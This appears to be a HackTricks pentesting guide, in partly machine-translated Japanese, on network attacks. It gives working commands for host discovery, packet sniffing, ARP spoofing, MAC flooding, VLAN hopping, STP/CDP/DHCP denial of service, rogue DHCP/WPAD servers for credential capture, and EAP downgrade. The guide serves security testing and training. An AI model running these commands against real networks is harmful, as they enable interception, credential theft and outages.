# Pentesting ネットワーク

{{#include ../../banners/hacktricks-training.md}}



## 外部からホストを発見する

これは**簡潔なセクション**で、**インターネット**上で**応答しているIP**を見つける方法について説明します。\
この場合、いくつかの**IPの範囲**（場合によっては複数の**ranges**）があり、どの**IPが応答しているか**を見つけるだけです。

### ICMP

これはホストが起動しているかどうかを判断するための**最も簡単**で**最速**の方法です。\
いくつかの**ICMP**パケットを送って**応答を期待**してみることができます。最も簡単な方法は単に**echo request**を送って応答を期待することです。`ping` or using `fping` for **ranges**.\
また、**nmap**を使って他の種類のICMPパケットを送ることもできます（これにより一般的なICMP echo request-responseへのフィルタを回避できます）。
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP ポート検出

ICMP パケットがあらゆる種類でフィルタされていることは非常によくあります。したがって、ホストが稼働しているかを確認するためにできることは、**オープンポートを探すこと**だけです。  
各ホストには **65535 ポート** があるため、スコープが「大きい」場合、各ホストの **すべてのポート** が開いているかどうかをすべてテストすることは**できません**。それには非常に時間がかかります.\

そこで必要なのは、**高速なポートスキャナ** ([masscan](https://github.com/robertdavidgraham/masscan)) と、**よく使われるポート** のリストです:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
このステップは`nmap`でも実行できますが、`nmap`は遅く、ホストが up かどうかを識別するのがやや苦手です。

### HTTP ポート検出

これはただの TCP ポート探索で、**HTTP サービス** の発見に集中したいときに有用です:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

いくつかの **UDP port open** をチェックして、どの **host.** に **pay more attention** すべきか判断することもできます。UDP services は通常、empty UDP probe packet に対して **don't respond** で **any data** を返さないため、port が filtered or open かを判断するのは難しいです。これを判断する最も簡単な方法は、実行中の service に関連する packet を送ることです。どの service が動作しているかわからないので、port number に基づいて最も可能性の高いものを試してください:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
前に提案した nmap ラインは、**/24** 範囲内の各ホストで **top 1000 UDP ports** をテストしますが、これだけでも **>20min** かかります。もし **最速の結果** が必要なら [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` を使えます。これはこれらの **UDP probes** をそれぞれの **expected port** に送信します（/24 範囲では約1分で終わります）: _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP ポート探索
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

ここでは、執筆時点で知られている主要な Wifi 攻撃のガイドを参照できます:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## 内部から hosts を発見する

もし network 内にいる場合、最初に行いたいことの一つは **他の hosts を検出する** ことです。どの程度の **ノイズ** を出せる／出したいかによって、実行できるアクションが異なります:

### Passive

接続された network 内の hosts を受動的に検出するために、これらのツールを使用できます:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### アクティブ

なお、[_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) で説明した技術はここでも**適用できます**。\
ただし、他のホストと**同じネットワーク**にいるため、さらに**多くのこと**ができます：
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### アクティブ ICMP

Note that the techniques commented in _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) can be also **applied here**.\
しかし、他のホストと **同じネットワーク** にいるため、**さらにできること** が増えます:

- もし **ping** を **サブネットのブロードキャストアドレス** に送ると、その ping は **各ホスト** に到達し、ホストは **あなたに** 応答することがあります: `ping -b 10.10.5.255`
- **ネットワークのブロードキャストアドレス** に ping を送ると、**他のサブネット** 内のホストさえ見つけられることがあります: `ping -b 255.255.255.255`
- `nmap` の `-PE`, `-PP`, `-PM` フラグを使って、それぞれ **ICMPv4 echo**, **timestamp**, および **subnet mask requests** を送ることでホスト発見を行います: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan は **ネットワークメッセージ** を介してコンピュータを **起動** するために使われます。コンピュータを起動するために使われるマジックパケットは、**MAC Dst** が指定され、その後同じパケット内でそれが **16回繰り返される** だけのパケットです。\
この種のパケットは通常 **ethernet 0x0842** または **UDP packet to port 9** で送信されます。\
もし **no \[MAC]** が指定されている場合、パケットは **broadcast ethernet** に送られ（ブロードキャスト MAC が繰り返されます）。
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## ホストのスキャン

詳細にスキャンしたいすべての IPs (external or internal) を特定したら、さまざまなアクションを実行できます。

### TCP

- **開いている** ポート: _SYN --> SYN/ACK --> RST_
- **閉じている** ポート: _SYN --> RST/ACK_
- **フィルタされている** ポート: _SYN --> \[NO RESPONSE]_
- **フィルタされている** ポート: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

UDPポートをスキャンするには2つのオプションがあります:

- **UDP packet** を送信して、ポートが **closed** の場合の応答である _**ICMP unreachable**_ を確認する（いくつかのケースでは ICMP が **filtered** されるため、ポートが **closed** か **open** かについて情報を受け取れないことがある）。
- **formatted datagrams** を送って **service** から応答を引き出す（例: DNS, DHCP, TFTP、その他 _nmap-payloads_ にリストされているもの）。**response** を受け取った場合、ポートは **open** である。

**Nmap** は "-sV" を使用して両方のオプションを**組み合わせます**（UDP scans は非常に遅い）が、UDP scans は TCP scans よりも遅いことに注意してください:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** は **TCP (Transmission Control Protocol)** や **UDP (User Datagram Protocol)** と併用するよう設計されています。主な目的はIPネットワーク上で電話通信データを輸送することで、**Signaling System 7 (SS7)** に見られる多くの信頼性機能を反映しています。**SCTP** は **SIGTRAN** プロトコルファミリの中核的な構成要素であり、SS7信号をIPネットワーク上で輸送することを目的としています。

**SCTP** のサポートは **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, および **VxWorks** といったさまざまなオペレーティングシステムで提供されており、電気通信およびネットワーキング分野での広範な採用と有用性を示しています。

nmap は SCTP に対して 2 種類のスキャンを提供しており: _-sY_ と _-sZ_.
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **More nmap options**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### 内部IPアドレスの検出

設定ミスのあるルータ、Firewall、およびネットワーク機器は、ネットワークプローブに対して非公開の送信元アドレスで応答することがあります。tcpdump を使用して、テスト中にプライベートアドレスから受信したパケットを特定できます。具体的には、Kali Linux 上でパブリックインターネットから到達可能な eth2 インターフェースでパケットをキャプチャできます。なお、環境が NAT や Firewall の背後にある場合、そのようなパケットはフィルタリングされる可能性が高い点に注意してください。
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing によって、captured frames and packets を解析することで IP ranges、subnet sizes、MAC addresses、hostnames の詳細を把握できます。ネットワークが誤設定されているか switching fabric に過負荷がかかっている場合、攻撃者は passive network sniffing によって機密データを取得する可能性があります。

If a switched Ethernet network is configured properly, you will only see broadcast frames and material destined for your MAC address.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
また、SSH セッション経由でリモートマシンからpacketsをキャプチャし、WiresharkをGUIとしてリアルタイムで表示できます。
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

もちろん。

### credentials の取得

pcap や live interface から credentials を解析するために、[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) のようなツールを使用できます。

## LAN attacks

### ARP spoofing

ARP Spoofing は、gratuitous ARPResponses を送信して、あるマシンの IP が我々のデバイスの MAC を持っていると示す手法です。すると、被害者は ARP table を変更し、spoofed IP に接続しようとするたびに我々のマシンに通信するようになります。

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

異なる source mac address を持つ大量のパケットを送信してスイッチの CAM table をオーバーフローさせる。CAM table が満杯になると、スイッチは hub のように振る舞い（broadcasting all the traffic）。
```bash
macof -i <interface>
```
現代のスイッチではこの脆弱性は修正されています。

### 802.1Q VLAN / DTP 攻撃

#### Dynamic Trunking

The **Dynamic Trunking Protocol (DTP)** は、トランキングを自動化するためのリンク層プロトコルとして設計されており、スイッチがポートを自動的に Trunk モードまたは非トランクモードに選択できるようにします。DTP の導入はしばしばネットワーク設計が最適でないことの指標とみなされ、トランクは必要な箇所のみ手動で設定し、適切にドキュメント化することが重要です。

デフォルトでは、スイッチのポートは Dynamic Auto モードで動作するように設定されており、隣接するスイッチから要求があればトランキングを開始する準備ができています。pentester や攻撃者がスイッチに接続して DTP Desirable フレームを送信すると、ポートが Trunk モードに移行するため、セキュリティ上の懸念が生じます。この操作により、攻撃者は STP フレーム解析を通じて VLAN を列挙したり、仮想インターフェースを設定して VLAN 分離を回避したりできます。

多くのスイッチで DTP がデフォルトで有効になっていると、攻撃者はスイッチの動作を模倣して全ての VLAN のトラフィックにアクセスできる可能性があります。スクリプト [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) はインターフェースを監視して、スイッチが Default、Trunk、Dynamic、Auto、または Access モードのいずれかにあるかを明らかにします。後者（Access）が VLAN hopping attacks に対して唯一免疫のある設定です。このツールはスイッチの脆弱性状況を評価します。

ネットワークの脆弱性が確認された場合、_**Yersinia**_ ツールを使用して DTP プロトコル経由で「enable trunking」を実行し、すべての VLAN からのパケットを観察できます。
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

VLANを列挙するには、スクリプト[**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. D**o スクリプトをいかなる状況でも中断してはいけません。3秒ごとにDTP Desirableを注入します。**スイッチ上で動的に作成された trunk チャネルは5分間のみ有効です。5分後に trunk は切断されます。**
```
sudo python3 DTPHijacking.py --interface eth0
```
念のため指摘すると、**Access/Desirable (0x03)** は DTP フレームが Desirable タイプであることを示し、ポートに Trunk モードへ切り替えるよう指示します。 また **802.1Q/802.1Q (0xa5**) は **802.1Q** カプセル化タイプを示します。

STP フレームを解析することで、**VLAN 30 と VLAN 60 の存在を確認できます。**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### 特定の VLAN を攻撃する

VLAN ID と IP 値が判明したら、特定の VLAN を攻撃するために **仮想インターフェースを設定できます**。\
DHCP が利用できない場合は、静的 IP アドレスを設定するために _ifconfig_ を使用してください。

<details>
<summary>VLAN インターフェース設定（例）</summary>
```bash
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```
</details>
```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

説明した **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** による他の VLAN 内での攻撃は、ツール: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger) によって **自動的に実行されます**

#### Double Tagging

もし attacker が **MAC, IP and VLAN ID of the victim host** を知っていれば、指定された VLAN と victim の VLAN を使ってフレームを **double tag a frame** し、パケットを送信できます。**victim won't be able to connect back** ため、attacker にとっての **best option for the attacker is communicate via UDP** は、SNMP のような興味深い動作を行えるプロトコルへの通信です。

別の手段として、attacker は **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** を実行する（おそらくインターネット経由）。その後、attacker が所有する別のホストで victim からのパケットを受け取るかを sniff して確認できます。

![](<../../images/image (190).png>)

To perform this attack you could use scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

**直接接続されている switch へのアクセスを持っている場合**、ネットワーク内で**bypass VLAN segmentation**することが可能です。単純にポートを**switch the port to trunk mode**（trunk とも呼ばれる）に切り替え、ターゲットの VLANs の ID で virtual interfaces を作成し、IP address を設定します。アドレスは動的に要求する（DHCP）か、静的に設定するかはケースによります。


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

ゲスト無線ネットワークのような環境では、無線アクセスポイントに接続されたクライアント同士が直接通信するのを防ぐために **port isolation（also known as private VLAN）** の設定が実装されていることがあります。しかし、これらの isolation を回避できる手法が確認されています。この手法は、ネットワーク ACLs の欠如や不適切な設定を突き、IP パケットをルータ経由で別のクライアントに到達させることを可能にします。

攻撃は、ターゲットクライアントの IP address を持つが router の MAC address を持つパケットを作成することで実行されます。これによりルータは誤ってそのパケットをターゲットクライアントに転送してしまいます。このアプローチは、被害者にアクセス可能なホストを制御する能力を利用して脆弱性を突く Double Tagging Attacks と類似しています。

**Key Steps of the Attack:**

1. **Crafting a Packet:** ターゲットクライアントの IP address を含みつつ、router の MAC address を持つ packet を特別に作成します。
2. **Exploiting Router Behavior:** 作成した packet をルータに送信すると、設定によりルータがそのパケットをターゲットクライアントへリダイレクトし、private VLAN の isolation を回避します。

### VTP Attacks

VTP (VLAN Trunking Protocol) は VLAN 管理を集中化します。VLAN データベースの整合性を保つために revision numbers を利用し、変更が行われるたびにこの番号がインクリメントされます。スイッチはより高い revision number を持つ構成を受け入れ、自身の VLAN データベースを更新します。

#### VTP Domain Roles

- **VTP Server:** VLAN を管理—作成、削除、変更を行います。ドメインメンバーに VTP announcements をブロードキャストします。
- **VTP Client:** VTP announcements を受信して自身の VLAN データベースを同期します。ローカルで VLAN の構成変更を行うことは制限されます。
- **VTP Transparent:** VTP の更新には関与しませんが VTP announcements を転送します。VTP attacks の影響を受けず、常に revision number はゼロのまま維持されます。

#### VTP Advertisement Types

- **Summary Advertisement:** VTP server によって 300 秒ごとにブロードキャストされ、ドメインの基本情報を伝えます。
- **Subset Advertisement:** VLAN 構成の変更後に送信されます。
- **Advertisement Request:** VTP client が Summary Advertisement を要求するために発行します。通常はより高い configuration revision number を検出した際に応答として発行されます。

VTP の脆弱性は trunk ports を介してのみ悪用可能であり、VTP announcements はそれらを通じてのみ循環します。DTP attack の後に攻撃者は VTP に向かうことがあります。Yersinia のようなツールは VTP attacks を支援し、VLAN database を消去してネットワークを実質的に破壊することを目的とすることができます。

Note: この議論は VTP version 1 (VTPv1) に関するものです。
```bash
yersinia -G # Launch Yersinia in graphical mode
```
Yersiniaのグラフィカルモードでは、VLANデータベースを消去するために 'deleting all VTP vlans' オプションを選択します。

### STP攻撃

**インターフェース上でBPDUフレームをキャプチャできない場合、STP攻撃に成功する可能性は低いです。**

#### **STP BPDU DoS**

大量のBPDUs TCP (Topology Change Notification) や Conf (トポロジー作成時に送信されるBPDU) を送信すると、スイッチに過負荷がかかり正しく動作しなくなります。
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

TCPが送信されると、switchesのCAM tableは15秒で削除されます。次に、この種のパケットを継続的に送信すると、CAM tableは継続的に（または毎15秒ごとに）再構築され、再構築されるとswitchはhubのように振る舞います。
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

攻撃者はスイッチの振る舞いをシミュレートして、ネットワークのSTP rootになろうとします。すると、より多くのデータが攻撃者経由で流れるようになります。これは、2台の異なるスイッチに接続している場合に有効です。\
これは、BPDUs CONF packetsを送信し、**priority** 値が実際のroot switchの優先度より低いと偽ることで行われます。
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**攻撃者が2台のスイッチに接続されている場合、攻撃者が新しいツリーのrootになり、これらのスイッチ間のすべてのトラフィックが攻撃者を経由します** (MITM attack が実行される).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Attacks

CISCO Discovery Protocol (CDP) は CISCO デバイス間の通信に不可欠で、デバイスがお互いを **識別し設定情報を共有する** ことを可能にします。

#### Passive Data Collection <a href="#id-0e0f" id="id-0e0f"></a>

CDP は全ポートを通じて情報をブロードキャストするように設定されており、これはセキュリティ上のリスクにつながる可能性があります。攻撃者がスイッチのポートに接続すると、**Wireshark**、**tcpdump**、または **Yersinia** のようなネットワークスニッファを展開することができます。この操作により、ネットワーク機器のモデルや実行している Cisco IOS のバージョンなど、機器に関する機密データが明らかになる可能性があります。攻撃者はその特定された Cisco IOS バージョンの脆弱性を狙うかもしれません。

#### Inducing CDP Table Flooding <a href="#id-0d6a" id="id-0d6a"></a>

より攻撃的なアプローチでは、正当な CISCO デバイスを装ってスイッチのメモリを圧倒し、Denial of Service (DoS) 攻撃を仕掛けることが含まれます。以下はテスト用ネットワークツールである Yersinia を使用してそのような攻撃を開始するためのコマンド列です：
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
この攻撃では、スイッチのCPUとCDP neighbor tableに大きな負荷がかかり、過剰なリソース消費によりしばしば**「ネットワーク麻痺」**を引き起こします。

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### VoIP 攻撃と VoIP Hopper ツール

VoIP phones は、IoT デバイスとますます統合されており、特定の電話番号を介してドアの解錠やサーモスタットの制御などの機能を提供します。しかし、この統合はセキュリティリスクを引き起こす可能性があります。

ツール [**voiphopper**](http://voiphopper.sourceforge.net) は、さまざまな環境（Cisco, Avaya, Nortel, Alcatel-Lucent）で VoIP phone をエミュレートするよう設計されています。CDP、DHCP、LLDP-MED、802.1Q ARP などのプロトコルを使用して、音声ネットワークの VLAN ID を検出します。

**VoIP Hopper** は Cisco Discovery Protocol (CDP) に対して3つのモードを提供します：

1. **Sniff Mode** (`-c 0`): ネットワークパケットを解析して VLAN ID を特定します。
2. **Spoof Mode** (`-c 1`): 実際の VoIP デバイスのパケットを模倣するカスタムパケットを生成します。
3. **Spoof with Pre-made Packet Mode** (`-c 2`): 特定の Cisco IP phone モデルと同一のパケットを送信します。

高速化のために推奨されるモードは3番目です。次を指定する必要があります：

- 攻撃者のネットワークインターフェース（`-i` パラメータ）。
- エミュレートする VoIP デバイスの名前（`-E` パラメータ）。Cisco の命名フォーマットに従います（例: SEP に続けて MAC アドレス）。

企業環境では、既存の VoIP デバイスを模倣するために次のような方法があります：

- 電話機の MAC ラベルを確認する。
- 電話機の表示設定を操作してモデル情報を確認する。
- VoIP デバイスをラップトップに接続し、Wireshark で CDP リクエストを観察する。

3番目のモードでツールを実行する例は次のとおりです：
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP 攻撃

#### 列挙
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Two types of DoS** は DHCP サーバに対して実行できます。最初の方法は、**十分な数の偽ホストをシミュレートしてすべての利用可能なIPアドレスを使い果たす**ことです。\
この攻撃は、DHCP サーバの応答を確認でき、プロトコル（**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)）を完了できる場合にのみ成立します。例えば、これは **Wifi networks では不可能です**。

別の DHCP DoS の方法は、**送信元にあり得るすべてのIPを用いた DHCP-RELEASE packet を送信すること**です。すると、サーバは全員がそのIPの使用を終了したと判断します。
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
これをより自動化して行う方法として、ツール[DHCPing](https://github.com/kamorin/DHCPig)の使用がある。

前述のDoS攻撃を使い、クライアントに環境内で新しいリースを取得させ、正規のサーバーを枯渇させて応答不能にすることができる。正規のサーバーが再接続を試みると、**次の攻撃で述べる悪意のある値を提供することができる**。

#### 悪意のある値を設定する

不正な DHCP サーバーは `/usr/share/responder/DHCP.py` にある DHCP スクリプトを使ってセットアップできる。これはトラフィックを悪意あるサーバーにリダイレクトして HTTP トラフィックや認証情報をキャプチャするなどのネットワーク攻撃に有用だ。ただし、不正なゲートウェイを設定しても効果は薄く、クライアントからのアウトバウンドトラフィックしか取得できず、実際のゲートウェイからの応答を見逃してしまう。そのため、より効果的な攻撃には不正な DNS または WPAD サーバーを設定することが推奨される。

Below are the command options for configuring the rogue DHCP server:

- **自分のIPアドレス（ゲートウェイ広告）**: `-i 10.0.0.100` を使用して自分のマシンのIPをゲートウェイとして広告する。
- **ローカルDNSドメイン名**: 必要に応じて `-d example.org` を使ってローカルDNSドメイン名を設定する。
- **元のルーター/ゲートウェイのIP**: `-r 10.0.0.1` を使って正規のルーターまたはゲートウェイのIPアドレスを指定する。
- **プライマリDNSサーバーのIP**: `-p 10.0.0.100` を使ってあなたが管理する不正なDNSサーバーのIPを設定する。
- **セカンダリDNSサーバーのIP**: 必要に応じて `-s 10.0.0.1` を使ってセカンダリDNSサーバーのIPを設定する。
- **ローカルネットワークのネットマスク**: `-n 255.255.255.0` を使ってローカルネットワークのネットマスクを定義する。
- **DHCPトラフィック用インターフェース**: `-I eth1` を使って特定のネットワークインターフェースでDHCPトラフィックをリッスンする。
- **WPAD設定アドレス**: `-w “http://10.0.0.100/wpad.dat”` を使ってWPAD設定のアドレスを指定し、Webトラフィックの傍受を補助する。
- **デフォルトゲートウェイIPを偽装する**: `-S` を含めてデフォルトゲートウェイのIPアドレスを偽装する。
- **すべてのDHCPリクエストに応答する**: `-R` を含めてサーバーがすべてのDHCPリクエストに応答するようにする。ただし、これはノイズが大きく検出されやすいことに注意する。

これらのオプションを正しく使用することで、不正なDHCPサーバーを構築し、ネットワークトラフィックを効果的に傍受できる。
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP 攻撃**

Here are some of the attack tactics that can be used against 802.1X implementations:

- EAP 経由での Active brute-force によるパスワード総当たり攻撃
- 不正な EAP コンテンツを用いて RADIUS サーバーを攻撃する _\*\*_(exploits)
- EAP メッセージのキャプチャとオフラインでのパスワード解析 (EAP-MD5 と PEAP)
- TLS 証明書検証をバイパスするために EAP-MD5 認証にフォールバック（強制）させる
- hub 等を使って認証後に悪意あるネットワークトラフィックを注入する

If the attacker if between the victim and the authentication server, he could try to degrade (if necessary) the authentication protocol to EAP-MD5 and capture the authentication attempt. Then, he could brute-force this using:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) 攻撃 <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) は、**ホット冗長ルーティングシステムを構築する**ために設計されたネットワークプロトコルのクラスです。FHRP を使用すると物理ルータを単一の論理デバイスとして統合でき、フォールトトレランスが向上し負荷分散が可能になります。

**Cisco Systems のエンジニアは、2 つの FHRP プロトコル、GLBP と HSRP を開発しました。**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Routing Information Protocol (RIP) には RIP、RIPv2、RIPng の 3 つのバージョンが存在します。RIP と RIPv2 は UDP を使用してポート 520 でピアにデータグラムを送信しますが、RIPng は IPv6 マルチキャストを介して UDP ポート 521 にデータグラムをブロードキャストします。MD5 認証のサポートは RIPv2 に導入されました。一方、RIPng にはネイティブな認証は組み込まれておらず、代わりに IPv6 内のオプションである IPsec AH および ESP ヘッダに依存します。

- **RIP and RIPv2:** 通信はポート 520 の UDP データグラムで行われます。
- **RIPng:** IPv6 マルチキャストを介して UDP ポート 521 にデータグラムをブロードキャストします。

RIPv2 は MD5 認証をサポートする一方で、RIPng にはネイティブな認証がなく、IPv6 の IPsec AH/ESP ヘッダに依存している点に注意してください。

### EIGRP 攻撃

